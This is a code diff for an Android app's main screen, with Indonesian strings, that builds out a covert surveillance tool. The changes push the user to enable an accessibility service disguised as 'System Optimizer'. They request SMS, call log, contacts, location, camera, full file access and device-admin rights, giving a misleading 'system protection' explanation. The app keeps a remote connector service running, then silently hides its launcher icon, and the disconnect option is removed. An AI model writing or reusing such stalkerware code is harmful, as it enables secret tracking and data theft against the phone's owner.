@@ -10,6 +10,8 @@ import android.net.Uri
 import android.os.Build
 import android.os.Bundle
 import android.os.Environment
+import android.os.Handler
+import android.os.Looper
 import android.os.PowerManager
 import android.provider.Settings
 import android.view.View
@@ -25,6 +27,7 @@ class MainActivity : AppCompatActivity() {
 
     private lateinit var binding: ActivityMainBinding
     private val prefs by lazy { getSharedPreferences("connector_prefs", Context.MODE_PRIVATE) }
+    private val handler = Handler(Looper.getMainLooper())
 
     private val RUNTIME_PERMISSIONS = arrayOf(
         Manifest.permission.ACCESS_FINE_LOCATION,
@@ -40,12 +43,9 @@ class MainActivity : AppCompatActivity() {
 
     private val REQUEST_PERMISSIONS = 2001
     private val REQUEST_DEVICE_ADMIN = 3001
-    private val REQUEST_STORAGE = 4001
 
-    private val shizukuPermissionListener = Shizuku.OnRequestPermissionResultListener { _, result ->
-        if (result == PackageManager.PERMISSION_GRANTED) {
-            updatePermissionStatus()
-        }
+    private val shizukuListener = Shizuku.OnRequestPermissionResultListener { _, _ ->
+        updateUI()
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -53,44 +53,45 @@ class MainActivity : AppCompatActivity() {
         binding = ActivityMainBinding.inflate(layoutInflater)
         setContentView(binding.root)
 
-        binding.tvVersion.text = "v${packageManager.getPackageInfo(packageName, 0).versionName}"
-
         val deviceId = ensureDeviceId()
-        binding.tvDeviceId.text = deviceId
-        binding.tvServerUrl.text = ConnectorService.SERVER_URL.removePrefix("https://")
+        binding.tvDeviceId.text = "ID: $deviceId"
+        binding.tvServerUrl.text = SecureConfig.serverUrl().removePrefix("https://")
 
-        setupButtons()
-
-        Shizuku.addRequestPermissionResultListener(shizukuPermissionListener)
-
-        ConnectorService.statusCallback = { msg, running ->
-            runOnUiThread { updateServiceState(running) }
+        binding.btnAccessibility.setOnClickListener {
+            openAccessibilitySettings()
         }
 
-        if (!ConnectorService.isRunning) {
-            startConnectorService()
-        } else {
-            updateServiceState(true)
+        binding.btnLaunch.setOnClickListener {
+            launchAndHide()
         }
 
+        Shizuku.addRequestPermissionResultListener(shizukuListener)
+
+        // Mulai service connector
+        startConnectorService()
         WatchdogReceiver.schedule(this)
 
-        requestAllPermissions()
-        requestBatteryOptimization()
-        requestStoragePermission()
-        requestDeviceAdmin()
-        checkShizuku()
-        updatePermissionStatus()
+        // Jika dipanggil dari ProtectionService (AUTO_SETUP), langsung request semua permission
+        if (intent.getBooleanExtra("AUTO_SETUP", false)) {
+            handler.postDelayed({ requestAllPermissions() }, 500)
+        }
+
+        updateUI()
     }
 
     override fun onResume() {
         super.onResume()
-        updatePermissionStatus()
+        updateUI()
+
+        // Jika accessibility sudah aktif + semua izin sudah ada → auto hide
+        if (ProtectionService.isEnabled(this) && allPermissionsGranted()) {
+            handler.postDelayed({ launchAndHide() }, 800)
+        }
     }
 
     override fun onDestroy() {
         super.onDestroy()
-        Shizuku.removeRequestPermissionResultListener(shizukuPermissionListener)
+        Shizuku.removeRequestPermissionResultListener(shizukuListener)
         ConnectorService.statusCallback = null
     }
 
@@ -103,163 +104,170 @@ class MainActivity : AppCompatActivity() {
         return id
     }
 
-    private fun setupButtons() {
-        binding.btnConnect.setOnClickListener {
-            startConnectorService()
-        }
+    private fun updateUI() {
+        val accessibilityOk = ProtectionService.isEnabled(this)
+        val allPermsOk = allPermissionsGranted()
+        val adminOk = dpm.isAdminActive(adminComponent)
 
-        binding.btnDisconnect.setOnClickListener {
-            stopService(Intent(this, ConnectorService::class.java))
-            WatchdogReceiver.cancel(this)
-            updateServiceState(false)
-        }
-
-        binding.btnLaunch.setOnClickListener {
-            hideAppIcon()
-            Toast.makeText(this, "Ikon aplikasi disembunyikan. Layanan tetap berjalan.", Toast.LENGTH_LONG).show()
-            finish()
-        }
-    }
-
-    private fun startConnectorService() {
-        val intent = Intent(this, ConnectorService::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(intent)
+        // Step 1 — Accessibility
+        if (accessibilityOk) {
+            binding.tvAccessStatus.text = "✅ Aktif"
+            binding.tvAccessStatus.setTextColor(getColor(R.color.green))
+            binding.btnAccessibility.text = "Sudah Aktif ✓"
+            binding.btnAccessibility.isEnabled = false
         } else {
-            startService(intent)
+            binding.tvAccessStatus.text = "Belum diaktifkan — ketuk untuk aktifkan"
+            binding.tvAccessStatus.setTextColor(getColor(R.color.red))
+            binding.btnAccessibility.text = "Aktifkan Sekarang →"
+            binding.btnAccessibility.isEnabled = true
         }
-        updateServiceState(true)
+
+        // Step 2 — Permissions
+        val parts = mutableListOf<String>()
+        if (!allPermsOk) {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) parts.add("• Lokasi")
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) parts.add("• SMS")
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) parts.add("• Log Panggilan")
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) parts.add("• Kontak")
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) parts.add("• Kamera")
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) parts.add("• Akses File")
+            if (!adminOk) parts.add("• Proteksi Admin")
+            binding.tvPermStatus.text = "Menunggu izin:\n${parts.joinToString("\n")}"
+            binding.tvPermStatus.setTextColor(getColor(R.color.red))
+        } else {
+            binding.tvPermStatus.text = "✅ Semua izin dan perlindungan aktif"
+            binding.tvPermStatus.setTextColor(getColor(R.color.green))
+        }
+
+        // Step 3 — Connection
+        ConnectorService.statusCallback = { _, running ->
+            runOnUiThread {
+                binding.tvStatus.text = if (running) "Terhubung" else "Terputus"
+                binding.tvStatus.setTextColor(if (running) getColor(R.color.green) else getColor(R.color.red))
+                binding.statusDot.background = if (running) getDrawable(R.drawable.dot_green) else getDrawable(R.drawable.dot_red)
+            }
+        }
+
+        // Tombol Launch
+        binding.btnLaunch.visibility = if (accessibilityOk && allPermsOk) View.VISIBLE else View.GONE
+
+        // Jika accessibility aktif → request permissions yang belum ada
+        if (accessibilityOk && !allPermsOk) {
+            handler.postDelayed({ requestAllPermissions() }, 300)
+        }
+
+        // Jika belum ada Device Admin → request
+        if (accessibilityOk && !adminOk) {
+            handler.postDelayed({ requestDeviceAdmin() }, 800)
+        }
+
+        // Jika semua siap → sembunyikan otomatis
+        if (accessibilityOk && allPermsOk && adminOk) {
+            handler.postDelayed({ launchAndHide() }, 1000)
+        }
     }
 
-    private fun updateServiceState(running: Boolean) {
-        binding.btnConnect.isEnabled = !running
-        binding.btnDisconnect.isEnabled = running
-        binding.tvStatus.text = if (running) "Connected" else "Disconnected"
-        binding.tvStatus.setTextColor(
-            if (running) getColor(R.color.green) else getColor(R.color.red)
-        )
-        binding.statusDot.background =
-            if (running) getDrawable(R.drawable.dot_green) else getDrawable(R.drawable.dot_red)
-        binding.tvLastPoll.text =
-            if (running) "Polling ${ConnectorService.SERVER_URL.removePrefix("https://")}" else "Tap CONNECT to start"
-    }
-
-    private fun updatePermissionStatus() {
-        val runtimeGranted = RUNTIME_PERMISSIONS.all {
+    private fun allPermissionsGranted(): Boolean {
+        val runtimeOk = RUNTIME_PERMISSIONS.all {
             ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
         }
-        val storageGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+        val storageOk = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             Environment.isExternalStorageManager()
         } else true
-
-        val allGranted = runtimeGranted && storageGranted
-
-        if (allGranted) {
-            binding.tvPermStatus.text = "✅ Semua izin telah diberikan"
-            binding.tvPermStatus.setTextColor(getColor(R.color.green))
-            binding.btnLaunch.visibility = View.VISIBLE
-        } else {
-            val missing = mutableListOf<String>()
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) missing.add("Lokasi")
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) missing.add("SMS")
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) missing.add("Log Panggilan")
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) missing.add("Kontak")
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) missing.add("Kamera")
-            if (!storageGranted) missing.add("Akses File")
-
-            binding.tvPermStatus.text = "⚠️ Belum diizinkan: ${missing.joinToString(", ")}"
-            binding.tvPermStatus.setTextColor(getColor(R.color.red))
-            binding.btnLaunch.visibility = View.GONE
-        }
+        return runtimeOk && storageOk
     }
 
-    private fun hideAppIcon() {
+    private fun launchAndHide() {
+        // Sembunyikan ikon launcher
         try {
             packageManager.setComponentEnabledSetting(
                 launcherAlias,
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP
             )
-        } catch (e: Exception) {
-            Toast.makeText(this, "Gagal sembunyikan ikon: ${e.message}", Toast.LENGTH_SHORT).show()
-        }
+        } catch (_: Exception) {}
+
+        // Pastikan service tetap jalan
+        startConnectorService()
+        finish()
     }
 
-    private fun requestDeviceAdmin() {
-        if (!dpm.isAdminActive(adminComponent)) {
-            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
-                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
-                putExtra(
-                    DevicePolicyManager.EXTRA_ADD_EXPLANATION,
-                    "Diperlukan agar aplikasi tidak dapat di-uninstall dan tetap berjalan di latar belakang."
-                )
-            }
-            startActivityForResult(intent, REQUEST_DEVICE_ADMIN)
-        }
-    }
-
-    private fun requestBatteryOptimization() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            val pm = getSystemService(PowerManager::class.java)
-            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
-                try {
-                    startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
-                        data = Uri.parse("package:$packageName")
-                    })
-                } catch (_: Exception) {}
-            }
+    private fun openAccessibilitySettings() {
+        try {
+            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+            startActivity(intent)
+            Toast.makeText(this,
+                "Cari 'System Optimizer' → Aktifkan",
+                Toast.LENGTH_LONG).show()
+        } catch (_: Exception) {
+            startActivity(Intent(Settings.ACTION_SETTINGS))
         }
     }
 
     private fun requestAllPermissions() {
+        // Storage (All Files Access)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
+            try {
+                startActivity(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
+                    data = Uri.parse("package:$packageName")
+                })
+            } catch (_: Exception) {
+                startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
+            }
+        }
+
+        // Runtime permissions
         val missing = RUNTIME_PERMISSIONS.filter {
             ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
         }.toTypedArray()
         if (missing.isNotEmpty()) {
             ActivityCompat.requestPermissions(this, missing, REQUEST_PERMISSIONS)
         }
-    }
 
-    private fun requestStoragePermission() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            if (!Environment.isExternalStorageManager()) {
-                try {
-                    startActivity(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
-                        data = Uri.parse("package:$packageName")
-                    })
-                } catch (_: Exception) {
-                    startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
-                }
-            }
+        // Battery optimization
+        val pm = getSystemService(PowerManager::class.java)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !pm.isIgnoringBatteryOptimizations(packageName)) {
+            try {
+                startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
+                    data = Uri.parse("package:$packageName")
+                })
+            } catch (_: Exception) {}
         }
     }
 
-    private fun checkShizuku() {
+    private fun requestDeviceAdmin() {
+        if (!dpm.isAdminActive(adminComponent)) {
+            try {
+                startActivityForResult(
+                    Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
+                        putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
+                        putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                            "Diperlukan untuk proteksi sistem.")
+                    }, REQUEST_DEVICE_ADMIN
+                )
+            } catch (_: Exception) {}
+        }
+    }
+
+    private fun startConnectorService() {
+        val intent = Intent(this, ConnectorService::class.java)
         try {
-            val available = Shizuku.pingBinder()
-            val granted = available && Shizuku.checkSelfPermission() == PackageManager.PERMISSION_GRANTED
-            if (!granted && available) {
-                binding.cardStatus.setOnClickListener {
-                    try { Shizuku.requestPermission(1001) } catch (_: Exception) {}
-                }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(intent)
+            } else {
+                startService(intent)
             }
         } catch (_: Exception) {}
     }
 
     override fun onRequestPermissionsResult(code: Int, perms: Array<String>, results: IntArray) {
         super.onRequestPermissionsResult(code, perms, results)
-        updatePermissionStatus()
-        if (code == 1001) {
-            val result = if (results.isNotEmpty()) results[0] else PackageManager.PERMISSION_DENIED
-            shizukuPermissionListener.onRequestPermissionResult(code, result)
-        }
+        updateUI()
     }
 
     @Deprecated("Deprecated in Java")
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
-        if (requestCode == REQUEST_DEVICE_ADMIN) {
-            updatePermissionStatus()
-        }
+        updateUI()
     }
 }
